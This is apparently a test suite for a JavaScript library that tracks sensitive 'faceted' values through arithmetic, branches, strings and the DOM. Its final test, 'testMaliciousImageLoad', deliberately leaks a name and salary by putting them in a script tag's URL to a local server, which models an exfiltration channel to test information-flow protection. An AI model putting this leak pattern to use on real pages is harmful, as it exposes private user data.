function assertEquals(actual, expected, message) {
  if (typeof actual === typeof expected && expected === actual) {
    return true;
  } else {
    print("Assertion failed: got " + actual + ", expected " + expected);
    return false;
  }
}

function TestCases() {

  this.testUnaryMinus1 = function() {
    var v1 = 5;
    var v2 = -v1;
    return assertEquals(v2, -5);
  };

  this.testUnaryMinus2 = function() {
    var v1 = -5;
    var v2 = -v1;
    return assertEquals(v2, 5);
  };

  this.testFacetedUnaryMinus1 = function() {
    var f1 = policyEnv.mkSensitive("h", 1, 2);
    var f2 = -f1;
    var expected = policyEnv.mkSensitive("h", -1, -2);
    return assertEquals(f2, expected);
  };

  this.testFacetedUnaryMinus2 = function() {
    var f1 = policyEnv.mkSensitive("h", -1, -2);
    var f2 = -f1;
    var expected = policyEnv.mkSensitive("h", 1, 2);
    return assertEquals(f2, expected);
  };

  this.testBinaryAddition = function() {
    var v1 = 2;
    var v2 = 3;
    var v3 = v1 + v2;
    return assertEquals(v3, 5);
  };

  // Different principals
  this.testAddTwoFacetedValues1 = function () {
    var f1 = policyEnv.mkSensitive("h", 1, 2);
    var f2 = policyEnv.mkSensitive("l", 3, 3);
    var f3 = f1 + f2;
    var expected = policyEnv.mkSensitive("h", policyEnv.mkSensitive("l",4,4), policyEnv.mkSensitive("l",5,5));
    return assertEquals(f3, expected);
  };

  // Same principals
  this.testAddTwoFacetedValues2 = function () {
    var f1 = policyEnv.mkSensitive("h", 1, 2);
    var f2 = policyEnv.mkSensitive("h", 3, 3);
    var f3 = f1 + f2;
    var expected = policyEnv.mkSensitive("h", 4, 5);
    return assertEquals(f3, expected);
  };

  this.testAddFacetedToNonFaceted1 = function() {
    var f1 = policyEnv.mkSensitive("h", 1, 2);
    var v2 = 5;
    var f3 = f1 + v2;
    var expected = policyEnv.mkSensitive("h", 6, 7);
    return assertEquals(f3, expected);
  };

  this.testNonFacetedIfTrue = function() {
    var v1 = 10;
    if (10 === v1) {
      v1 += 1;
    }
    return assertEquals(v1, 11);
  };

  this.testNonFacetedIfFalse = function() {
    var v1 = 10;
    if (11 === v1) {
      v1 += 1;
    }
    return assertEquals(v1, 10);
  };

  this.testFacetedIf = function() {
    var f1 = policyEnv.mkSensitive("h", false, true);
    var v1 = 8;
    if (f1) {
      v1 = 10;
    } else {
      v1 = 11;
    }
    var expected = policyEnv.mkSensitive("h", 11, 10);
    return assertEquals(v1, expected);
  };

  this.testFacetedIf2 = function() {
    var f1 = policyEnv.mkSensitive("h", 20, 55);
    var v1 = 8;
    if (f1 < 22) {
      v1 = 10;
    } else {
      v1 = 11;
    }
    var expected = policyEnv.mkSensitive("h", 10, 11);
    return assertEquals(v1, expected);
  };

  this.testFacetedIf3 = function() {
    var f1 = policyEnv.mkSensitive("h", 25, 0);
    var v1;
    if (f1 > 0) {
      v1 = f1 - 1;
    }
    var expected = policyEnv.mkSensitive("h", 24);
    return assertEquals(v1, expected);
  };

  this.testFacetedIf2 = function() {
    var f1 = policyEnv.mkSensitive("h", 20, 55);
    var v1 = 8;
    if (f1 < 22) {
      v1 = 10;
    } else {
      v1 = 11;
    }
    var expected = policyEnv.mkSensitive("h", 10,11);
    return assertEquals(v1, expected);
  };

  this.testPolicySimple = function() {
    var x = policyEnv.mkLabel("x");
    policyEnv.restrict(x, function (context) {
      return context === 42;
    });
    var a = policyEnv.mkSensitive(x, 10, 15);
    return assertEquals(policyEnv.concretize(42, a), 10);
  };

  this.testPolicySimpleGoWrong = function() {
    var x = policyEnv.mkLabel("x");
    policyEnv.restrict(x, function (context) {
      return context === 42;
    });
    var a = policyEnv.mkSensitive(x, 10, 15);
    return assertEquals(policyEnv.concretize(-2, a), 15);
  };

  this.testPolicyComplexFacets = function() {
    var x = policyEnv.mkLabel("x");
    policyEnv.restrict(x, function (context) {
      return context.val1 === 22 && context.val2 === 21;
    });

    var y = policyEnv.mkLabel("y");
    policyEnv.restrict(y, function (context) {
      return context.val2 === 22;
    });
    var a = policyEnv.mkSensitive(x, policyEnv.mkSensitive(y, 10, 15), 0);
    return assertEquals(policyEnv.concretize({val1: 22, val2: 21}, a), 15);
  };

  this.testPartialConcretize = function() {
    var x = policyEnv.mkLabel("x");
    policyEnv.restrict(x, function (context) {
      return context.val1 === 22 && context.val2 === 21;
    });

    var y = policyEnv.mkLabel("y");
    policyEnv.restrict(y, function (context) {
      return context.otherVal = 44;
    });
    var a = policyEnv.mkSensitive(x, policyEnv.mkSensitive(y, 10, 15), 0);

    var expected = policyEnv.mkSensitive("y", 10,15);
    var result1 = assertEquals(policyEnv.partialConcretize({val1: 22, val2: 21}, a), expected);
    var result2 = assertEquals(policyEnv.partialConcretize({val:22}, a), 0);
    return result2 && result1;
  };

  this.testIncrement = function() {
    var x = 1;
    return assertEquals(++x, 2);
  };

  this.testIncrement2 = function() {
    var x = 1;
    return assertEquals(x++, 1) && assertEquals(x, 2);
  };

  this.testDecrement = function() {
    var x = 1;
    return assertEquals(--x, 0);
  };

  this.testDecrement2 = function() {
    var x = 1;
    return assertEquals(x--, 1) && assertEquals(x, 0);
  };

  this.testFacetedIncrement = function () {
    var x = policyEnv.mkSensitive("h", 2, 1);
    var expected1 = policyEnv.mkSensitive("h",2,1);
    var expected2 = policyEnv.mkSensitive("h",3,2);
    return assertEquals(x++, expected1) && assertEquals(x, expected2);
  };

  this.testFacetedDecrement = function () {
    var x = policyEnv.mkSensitive("h", 2, 1);
    var expected1 = policyEnv.mkSensitive("h",2,1);
    var expected2 = policyEnv.mkSensitive("h",1,0);
    return assertEquals(x--, expected1) && assertEquals(x, expected2);
  };

  this.testFacetedIncrement2 = function () {
    var x = policyEnv.mkSensitive("h", 2, 1);
    var expected = policyEnv.mkSensitive("h",3,2);
    return assertEquals(++x, expected);
  };

  this.testFacetedDecrement2 = function () {
    var x = policyEnv.mkSensitive("h", 2, 1);
    var expected = policyEnv.mkSensitive("h",1,0);
    return assertEquals(--x, expected);
  };

  this.testFor = function() {
    var x;
    for (x = 0; x < 10; x++) {
      var i = 1;
    }
    return assertEquals(x, 10);
  };

  this.testWhile = function () {
    var x = 10;
    while (x > 1) {x--;}
    return assertEquals(x, 1);
  };

  this.testFacetedWhile = function () {
    var x = policyEnv.mkSensitive("h", 10, 12);
    while (x > 1) {x--;}
    var expected = policyEnv.mkSensitive("h", 1, 1);
    return assertEquals(x, expected);
  };

  this.testFacetedFunctionApplication = function() {
    var f1 = policyEnv.mkSensitive("h", 1, 2);
    var add = function(num) {
      return num + 2;
    };
    var f2 = add(f1);
    var expected = policyEnv.mkSensitive("h",3,4);
    return assertEquals(f2, expected);
  };

  this.testDom = function() {
    var domPolicyEnv = window.policyEnv;
    var fval = domPolicyEnv.mkSensitive("h", 1, 2);
    domPolicyEnv.restrict("h", function() { return false});
    document.body.appendChild(document.createTextNode(fval));
    var text = document.body.innerHTML;
    var expected = domPolicyEnv.mkSensitive("h", 1, 2);
    return assertEquals(text, expected);
  };

  this.testDomStringAppend = function() {
    var domPolicyEnv = window.policyEnv;
    var fval = domPolicyEnv.mkSensitive("h", "Manny", "JonDoe");
    document.body.appendChild(document.createTextNode(fval + "'s Salary"));
    var text = document.body.innerHTML;
    var expected = domPolicyEnv.mkSensitive("h", "Manny's Salary", "JonDoe's Salary");
    return assertEquals(text, expected);
  };

  this.testStringSlice = function () {
    var str = "Manny's Salary is:40000";
    var salPos = str.indexOf("Salary");
    var name = str.slice(0,salPos - 3);
    return assertEquals(name, "Manny");
  };

  this.testStringSliceFaceted = function () {
    var facetedStr = policyEnv.mkSensitive("salary", "Manny's Salary is:40000", "Sally's Salary is:0");
    var name = facetedStr.slice(0,5);
    var expected = policyEnv.mkSensitive("salary", "Manny", "Sally");
    return assertEquals(name, expected);
  };

  this.testDomSubstring = function() {
    var domPolicyEnv = window.policyEnv;
    var fName        = domPolicyEnv.mkSensitive("name", "Manny", "JonDoe");
    var fSalary      = domPolicyEnv.mkSensitive("salary",40000, 0);
    document.body.appendChild(document.createTextNode(fName + "'s Salary is:" + fSalary));
    var text      = document.body.innerHTML;
    var expected = domPolicyEnv.mkSensitive("name",
      domPolicyEnv.mkSensitive("salary", "Manny's Salary is:40000", "Manny's Salary is:0"),
      domPolicyEnv.mkSensitive("salary", "JonDoe's Salary is:40000", "JonDoe's Salary is:0")
    );
    return assertEquals(text, expected);
  };

  this.testMaliciousImageLoad = function () {
    var domPolicyEnv = window.policyEnv;
    var fName        = domPolicyEnv.mkSensitive("name", "Manny", "JonDoe");
    var fSalary      = domPolicyEnv.mkSensitive("salary",40000, 0);
    var imgSrc       = fName + "_" + fSalary + ".jpg";
    // var img = document.createElement("img");
    // img.setAttribute("src","http://localhost:8081/" + fName + "_" + fSalary + ".jpg");
    var script = document.createElement("script");
    script.setAttribute("src", "http://localhost:8081/" + fName + "_" + fSalary + ".jpg");
    document.body.appendChild(script);

  }
}

var testCaseObject = new TestCases();
var failCount = 0;
var passCount = 0;
var policyEnv = new PolicyEnvironment();
for (var testCase in testCaseObject) {
  if ("test" === testCase.substring(0,4)) {
    if (testCaseObject[testCase]()) {
      passCount++;
      print("Passed");
    } else {
      print(testCase + " Failed");
      failCount++;
    }
  }
}
print("Passed: " + passCount + "\tFailed: " + failCount);